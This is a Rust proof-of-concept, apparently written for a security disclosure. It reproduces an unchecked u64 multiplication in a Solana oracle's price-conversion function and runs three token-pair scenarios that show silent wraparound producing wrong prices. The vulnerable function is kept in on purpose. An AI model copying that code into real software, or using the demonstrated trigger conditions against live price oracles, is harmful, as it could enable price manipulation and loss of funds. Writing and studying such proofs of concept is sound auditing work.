/// Proof of Concept for price_of_lamports_to_price_of_tokens overflow vulnerability
/// This demonstrates how the overflow occurs with realistic mainnet values

use std::panic;

#[derive(Debug, Clone, Copy)]
pub struct Price {
    pub value: u64,
    pub exp: u64,
}

/// Vulnerable function from scope/programs/scope/src/utils/math.rs
pub fn price_of_lamports_to_price_of_tokens(
    lamport_price: Price,
    token_a_decimals: u64,
    token_b_decimals: u64,
) -> Price {
    let Price {
        value: lamport_value,
        exp: lamport_exp,
    } = lamport_price;

    if lamport_exp + token_b_decimals >= token_a_decimals {
        let exp = lamport_exp + token_b_decimals - token_a_decimals;
        Price {
            value: lamport_value,
            exp,
        }
    } else {
        let adjust_exp = token_a_decimals - (lamport_exp + token_b_decimals);
        // VULNERABILITY: This multiplication can overflow u64
        let value = lamport_value * 10_u64.pow(adjust_exp.try_into().unwrap());
        Price { value, exp: 0 }
    }
}

/// Simulates u64_div_to_price output
/// This function can produce mantissas up to ~1e18
pub fn simulate_u64_div_to_price(numerator: u64, denominator: u64) -> Price {
    // When denominator is small (e.g., 1-10), exp is 0 and ten_pow_exp is 1
    // When denominator is large (e.g., 1e18), exp is 18 and ten_pow_exp is 1e18
    
    let (exp, ten_pow_exp) = match denominator {
        0 => panic!("Division by zero"),
        1..=10 => (0, 1_u64),
        11..=100 => (1, 10),
        101..=1000 => (2, 100),
        1001..=10000 => (3, 1000),
        10001..=100000 => (4, 10000),
        100001..=1000000 => (5, 100000),
        1000001..=10000000 => (6, 1000000),
        10000001..=100000000 => (7, 10000000),
        100000001..=1000000000 => (8, 100000000),
        1000000001..=10000000000 => (9, 1000000000),
        10000000001..=100000000000 => (10, 10000000000),
        100000000001..=1000000000000 => (11, 100000000000),
        1000000000001..=10000000000000 => (12, 1000000000000),
        10000000000001..=100000000000000 => (13, 10000000000000),
        100000000000001..=1000000000000000 => (14, 100000000000000),
        1000000000000001..=10000000000000000 => (15, 1000000000000000),
        10000000000000001..=100000000000000000 => (16, 10000000000000000),
        100000000000000001..=1000000000000000000 => (17, 100000000000000000),
        _ => (18, 1000000000000000000),
    };
    
    // Using u128 to avoid overflow in intermediate calculation
    let numerator_scaled = (numerator as u128) * (ten_pow_exp as u128);
    let price_value = numerator_scaled / (denominator as u128);
    
    Price {
        value: price_value as u64,
        exp,
    }
}

fn main() {
    println!("=== Overflow Vulnerability POC for price_of_lamports_to_price_of_tokens ===\n");
    println!("u64::MAX = {}\n", u64::MAX);

    // Scenario 1: SOL (9 decimals) to USDC (6 decimals) - Most common on mainnet
    println!("Scenario 1: SOL/USDC pair (9 decimals to 6 decimals)");
    println!("----------------------------------------");
    
    // Simulate a large mantissa from u64_div_to_price
    // When numerator is close to denominator with small denominator
    let lamport_price_1 = simulate_u64_div_to_price(1_000_000_000_000_000_000, 1);
    println!("Input lamport_price from u64_div_to_price:");
    println!("  value: {}", lamport_price_1.value);
    println!("  exp: {}", lamport_price_1.exp);
    
    let token_a_decimals = 9; // SOL
    let token_b_decimals = 6; // USDC
    
    // Calculate adjust_exp
    let adjust_exp = if lamport_price_1.exp + token_b_decimals >= token_a_decimals {
        0 // Won't trigger else branch
    } else {
        token_a_decimals - (lamport_price_1.exp + token_b_decimals)
    };
    
    println!("\nCalculation:");
    println!("  lamport_exp + token_b_decimals = {} + {} = {}", 
             lamport_price_1.exp, token_b_decimals, lamport_price_1.exp + token_b_decimals);
    println!("  token_a_decimals = {}", token_a_decimals);
    println!("  adjust_exp = {} - {} = {}", 
             token_a_decimals, lamport_price_1.exp + token_b_decimals, adjust_exp);
    
    if adjust_exp > 0 {
        let multiplier = 10_u64.pow(adjust_exp as u32);
        println!("  Multiplication: {} * 10^{} = {} * {}", 
                 lamport_price_1.value, adjust_exp, lamport_price_1.value, multiplier);
        
        // Check for overflow
        match lamport_price_1.value.checked_mul(multiplier) {
            Some(result) => {
                println!("  Result: {} (no overflow)", result);
            }
            None => {
                println!("  Result: OVERFLOW! (value > u64::MAX)");
                // In release mode, this would wrap around silently
                let wrapped = lamport_price_1.value.wrapping_mul(multiplier);
                println!("  Wrapped value in release: {}", wrapped);
            }
        }
    }

    println!("\n========================================\n");

    // Scenario 2: Realistic Meteora DLMM case
    println!("Scenario 2: Meteora DLMM - High precision price");
    println!("----------------------------------------");
    
    // Meteora can produce very precise prices with small exp
    let numerator = 999_999_999_999_999_999; // Close to 1e18
    let denominator = 10; // Small denominator -> exp = 0
    let lamport_price_2 = simulate_u64_div_to_price(numerator, denominator);
    
    println!("Input from Meteora DLMM (via u64_div_to_price):");
    println!("  numerator: {}", numerator);
    println!("  denominator: {}", denominator);
    println!("  Resulting price value: {}", lamport_price_2.value);
    println!("  Resulting price exp: {}", lamport_price_2.exp);
    
    // With 9 to 6 decimal conversion
    let adjust_exp_2 = if lamport_price_2.exp + 6 >= 9 {
        0
    } else {
        9 - (lamport_price_2.exp + 6)
    };
    
    println!("\nWith SOL(9) to USDC(6):");
    println!("  adjust_exp = 9 - ({} + 6) = {}", lamport_price_2.exp, adjust_exp_2);
    
    if adjust_exp_2 > 0 {
        let multiplier = 10_u64.pow(adjust_exp_2 as u32);
        println!("  Need to multiply: {} * {}", lamport_price_2.value, multiplier);
        
        match lamport_price_2.value.checked_mul(multiplier) {
            Some(result) => {
                println!("  Result: {} (no overflow)", result);
            }
            None => {
                println!("  Result: OVERFLOW DETECTED!");
                let wrapped = lamport_price_2.value.wrapping_mul(multiplier);
                println!("  Wrapped value: {} (WRONG PRICE!)", wrapped);
                
                // Show the correct value using u128
                let correct = (lamport_price_2.value as u128) * (multiplier as u128);
                println!("  Correct value should be: {}", correct);
                println!("  Data loss: {}%", 
                         ((correct - wrapped as u128) * 100) / correct);
            }
        }
    }

    println!("\n========================================\n");

    // Scenario 3: KTokens case with share decimals
    println!("Scenario 3: KTokens Token-X - Share to Token conversion");
    println!("----------------------------------------");
    
    // KTokens uses this for share to token conversion
    // shares_issued could be small while token holdings are large
    let num_token_x = 1_000_000_000_000_000_000; // 1e18 token X
    let num_shares = 1_000; // Few shares issued
    
    let ktoken_price = simulate_u64_div_to_price(num_token_x, num_shares);
    println!("KToken scenario:");
    println!("  Token X holdings: {}", num_token_x);
    println!("  Shares issued: {}", num_shares);
    println!("  Price value: {}", ktoken_price.value);
    println!("  Price exp: {}", ktoken_price.exp);
    
    // Common case: kToken has 6 decimals, underlying token has 9
    let share_decimals = 6;
    let token_decimals = 9;
    
    let adjust_exp_3 = if ktoken_price.exp + token_decimals >= share_decimals {
        0
    } else {
        share_decimals - (ktoken_price.exp + token_decimals)
    };
    
    println!("\nWith share_decimals=6, token_decimals=9:");
    println!("  Condition: {} + {} >= {} ? {}", 
             ktoken_price.exp, token_decimals, share_decimals,
             ktoken_price.exp + token_decimals >= share_decimals);
    
    // This case likely won't overflow since we're going the other direction
    // But let's check the reverse case
    
    println!("\nReverse case - token_decimals=6, share_decimals=9:");
    let adjust_exp_rev = if ktoken_price.exp + 6 >= 9 {
        0
    } else {
        9 - (ktoken_price.exp + 6)
    };
    
    if adjust_exp_rev > 0 {
        println!("  adjust_exp = {}", adjust_exp_rev);
        let multiplier = 10_u64.pow(adjust_exp_rev as u32);
        
        match ktoken_price.value.checked_mul(multiplier) {
            Some(result) => {
                println!("  Result: {} (no overflow)", result);
            }
            None => {
                println!("  Result: OVERFLOW!");
                let wrapped = ktoken_price.value.wrapping_mul(multiplier);
                println!("  Wrapped to: {}", wrapped);
            }
        }
    }

    println!("\n========================================\n");
    println!("VULNERABILITY CONFIRMED!");
    println!("------------------------");
    println!("The overflow is easily triggered with:");
    println!("1. Common token pairs like SOL/USDC (9 vs 6 decimals)");
    println!("2. Large mantissa values from u64_div_to_price (up to ~1e18)");
    println!("3. Low exp values (0-2) which are common");
    println!("\nImpact: Silent wraparound in release builds produces completely wrong prices!");
}